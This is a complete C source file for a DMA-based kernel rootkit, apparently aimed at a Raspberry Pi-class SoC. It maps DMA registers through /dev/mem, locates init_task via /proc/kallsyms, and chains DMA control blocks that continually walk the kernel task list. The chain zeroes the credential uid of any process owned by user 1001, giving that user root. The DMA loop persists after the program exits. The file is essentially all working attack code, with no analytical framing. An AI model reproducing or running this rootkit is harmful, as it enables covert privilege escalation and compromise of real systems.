#include <assert.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>

#include "dma.h"
#include "mem.h"

#define TARGET_UID 1001

/* 64 MB to play with */
#define BUS_ADDRESS 0xfb000000u
#define SDRAM_BASE  0x3b000000
#define MEMORY_SIZE 0x04000000

#define BUS_SDRAM_ADDR   0xc0000000u
#define PAGE_OFFSET      0x80000000u
#define TASK_SIZE        0x5a0
#define NEXT_TASK_OFFSET 0x1c8
#define CRED_OFFSET      0x31c
#define UID_OFFSET       4

typedef volatile struct control_block *cb_t;
typedef volatile uint8_t vuint8_t;
typedef volatile uint32_t vuint32_t;

static struct dma_registers *dma;
static void *physical_memory;

/* This is only for virtual addresses pointing to in
 * [physical_memory, physical_memory + MEMORY_SIZE). */
static inline uintptr_t virtual_to_bus(volatile void *p)
{
	return (void *)p - physical_memory + BUS_ADDRESS;
}

static inline void *bus_to_virtual(uintptr_t addr)
{
	return (char *)physical_memory + (addr - BUS_ADDRESS);
}

static void setup(void)
{
	if (open_dev_mem())
	{
		perror("open /dev/mem");
		exit(1);
	}

	if (map_dma_registers())
	{
		perror("map DMA registers");
		exit(1);
	}
	int dma_channel = reserve_dma_channel();
	if (dma_channel == -1)
	{
		if (errno)
			perror("reserve dma channel");
		else
			fputs("out of DMA channels\n", stderr);
		exit(1);
	}
	printf("dma_channel = %d\n", dma_channel);
	dma = get_dma_channel(dma_channel);
	physical_memory = sdram_map(SDRAM_BASE, MEMORY_SIZE);
	if (physical_memory == MAP_FAILED)
	{
		perror("sdram_map");
		exit(1);
	}

	if (close_dev_mem())
	{
		perror("close /dev/mem");
		exit(1);
	}
	seteuid(getuid());
}

/* Returns the address of __ksymtab_init_task. */
static uintptr_t ksymtab_init_task_addr(void)
{
	FILE *fp = popen("grep __ksymtab_init_task /proc/kallsyms|cut -d' ' -f1", "r");
	assert(fp);
	char addr[9];
	assert(fread(addr, 8, 1, fp) == 1);
	fclose(fp);
	addr[8] = 0;
	return strtoul(addr, NULL, 16);
}

static void reset_dma(void)
{
	// Reset the DMA
	dma->cs = CS_RESET;

	// Wait for the DMA to complete
	while (dma->cs & CS_ACTIVE)
		;
}

static int stop_dma(int dma_channel)
{
	if (open_dev_mem())
	{
		perror("open /dev/mem");
		exit(1);
	}

	if (map_dma_registers())
	{
		perror("map DMA registers");
		exit(1);
	}
	dma = get_dma_channel(dma_channel);

	if (close_dev_mem())
	{
		perror("close /dev/mem");
		exit(1);
	}
	reset_dma();
	if (unreserve_dma_channel(dma_channel))
	{
		perror("failed to unreserve DMA channel");
		return 1;
	}
	return 0;
}

/* Start the DMA, but do not wait for it to end. */
static void run_dma(cb_t cb)
{
	reset_dma();

	dma->conblk_ad = virtual_to_bus(cb);
	dma->cs = DMA_CS_PANIC_PRIORITY(0) | DMA_CS_PRIORITY(0) | CS_DISDEBUG | CS_ACTIVE;
}

#define NEXT_CB ((cb_t)(-1))

static void setup_cb(volatile struct control_block *cb,
			 volatile void *dest, volatile void *src, size_t size,
			 cb_t next)
{
	cb->ti = TI_SRC_INC | TI_DEST_INC;
	cb->source_ad = src? virtual_to_bus(src):0;
	cb->dest_ad = dest? virtual_to_bus(dest):0;
	cb->txfr_len = size;
	cb->stride = 0;
	if (next == NEXT_CB)
		cb->nextconbk = virtual_to_bus(cb + 1);
	else if (next == NULL)
		cb->nextconbk = 0;
	else
		cb->nextconbk = virtual_to_bus(next);
}

int main(int argc, char *argv[])
{
	if (argc == 2)
		return stop_dma(atoi(argv[1]));
	else if (argc > 2)
	{
		fprintf(stderr, "Usage: %s [dma_channel]\n"
			        "dma_channel - Stop the rootkit using dma_channel\n",
			argv[0]);
		exit(1);
	}
	setup();

	uintptr_t addr = ksymtab_init_task_addr();

	// Control blocks
	const cb_t cb = bus_to_virtual(BUS_ADDRESS);

	// Tables
#define TABLE_ADDRESS (BUS_ADDRESS + 0x2000)
	vuint8_t *kv2b_table = bus_to_virtual(TABLE_ADDRESS);
	vuint8_t *low_table = kv2b_table + 0x100;
	vuint8_t *hi_table = low_table + 0x100;
	vuint32_t *address_table = (vuint32_t *)(hi_table + 0x100);
	
	// Data
#define DATA_ADDRESS (BUS_ADDRESS + 0x3000)
	vuint32_t *next_task = bus_to_virtual(DATA_ADDRESS);
	vuint32_t *cred = next_task + 1;
	vuint32_t *dummy = cred + 1;
	vuint8_t *uid = (vuint8_t *)(dummy + 1);
	
	// Build the rootkit tables.
	for (int i = 0; i < 0x100; ++i)
		kv2b_table[i] = i + ((BUS_SDRAM_ADDR - PAGE_OFFSET) >> 24);
	memset((void *)low_table, 0, 0x100);
	low_table[TARGET_UID & 0xff] = 4;
	memset((void *)hi_table, 0, 0x100);
	hi_table[TARGET_UID >> 8] = 8;

	// Build the rootkit control blocks.
	// 0. We start with the kernel virtual address of
	//    __ksymtab_init_task in addr. The first word is the
	//    kernel virtual address of init_task.
	setup_cb(cb + 0, &cb[1].source_ad, NULL, 4, NEXT_CB);
	cb[0].source_ad = addr - PAGE_OFFSET + BUS_SDRAM_ADDR;
	// 1. We want to read the word NEXT_TASK_OFFSET in so use a 2D
	//    transfer with YLENGTH + 1 = 2, XLENGTH = 4, D_STRIDE =
	//    -4, and S_STRIDE = NEXT_TASK_OFFSET - 4.
	setup_cb(cb + 1, next_task, NULL, (1 << 16) | 4, NEXT_CB);
	cb[1].ti |= TI_TDMODE;
	cb[1].stride = ((uint16_t)-4 << 16) | (NEXT_TASK_OFFSET - 4);

	// == Start of main loop ==
	// 2. next_task points to the kernel virtual pointer to the
	//    next task_struct's next pointer. We need to convert to a
	//    bus address.
	setup_cb(cb + 2, &cb[3].dest_ad, (vuint8_t *)next_task + 3, 1, NEXT_CB);
	// 3. Read from the table and store back to next_task + 3.
	setup_cb(cb + 3, (vuint8_t *)next_task + 3, kv2b_table, 1, NEXT_CB);
	// 4. Copy from next_task to cb[5]'s source.
	setup_cb(cb + 4, &cb[5].source_ad, next_task, 4, NEXT_CB);
	// 5. Copy the next_task and cred pointers using a 2D read.
	setup_cb(cb + 5, next_task, NULL, (1 << 16) | 4, NEXT_CB);
	cb[5].ti |= TI_TDMODE;
	cb[5].stride = (uint16_t)(NEXT_TASK_OFFSET - CRED_OFFSET - 4);
	// 6. cred now points to the kernel virtual pointer to the
	// crediental struct so convert to a bus address.
	setup_cb(cb + 6, &cb[7].source_ad, (vuint8_t *)cred + 3, 1, NEXT_CB);
	// 7. Read from the table and store back in cred.
	setup_cb(cb + 7, (vuint8_t *)cred + 3, kv2b_table, 1, NEXT_CB);
	// 8. Copy from cred to cb[9]'s source.
	setup_cb(cb + 8, &cb[9].source_ad, cred, 4, NEXT_CB);
	// 9. Copy the uid which lives 4 bytes into the struct.
	setup_cb(cb + 9, dummy, NULL, 6, NEXT_CB);

	// 10. Check if the low byte matches.
	setup_cb(cb + 10, &cb[11].source_ad, uid, 1, NEXT_CB);
	// 11. Use low_table as the offset table.
	setup_cb(cb + 11, &cb[12].source_ad, low_table, 1, NEXT_CB);
	// 12. Load from the address table into tramp. Use cb + 13 as
	// tramp.
	cb_t tramp = cb + 13;
	setup_cb(cb + 12, &tramp->nextconbk, address_table, 4, tramp);
	setup_cb(tramp, NULL, NULL, 0, NULL);
	address_table[0] = virtual_to_bus(cb + 2);
	address_table[1] = virtual_to_bus(cb + 14);

	// 14. Check if the high byte matches.
	setup_cb(cb + 14, &cb[15].source_ad, uid+1, 1, NEXT_CB);
	// 15. Use the hi_table as the offset_table.
	setup_cb(cb + 15, &cb[16].source_ad, hi_table, 1, NEXT_CB);
	// 16. Load from the address table into tramp.
	setup_cb(cb + 16, &tramp->nextconbk, address_table, 4, tramp);
	address_table[2] = virtual_to_bus(cb + 17);

	// 17. Write zeros over the uid.
	setup_cb(cb + 17, uid, &cb[17].stride, 4, NEXT_CB);
	cb[17].stride = 0;
	// 18. Copy from cred to cb[19]'s dest.
	setup_cb(cb + 18, &cb[19].dest_ad, cred, 4, NEXT_CB);
	// 19. Store the new cred values and loop.
	setup_cb(cb + 19, NULL, dummy, 8, cb + 2);

	// Start the DMA running and then exit.
	run_dma(cb);
	return 0;
}
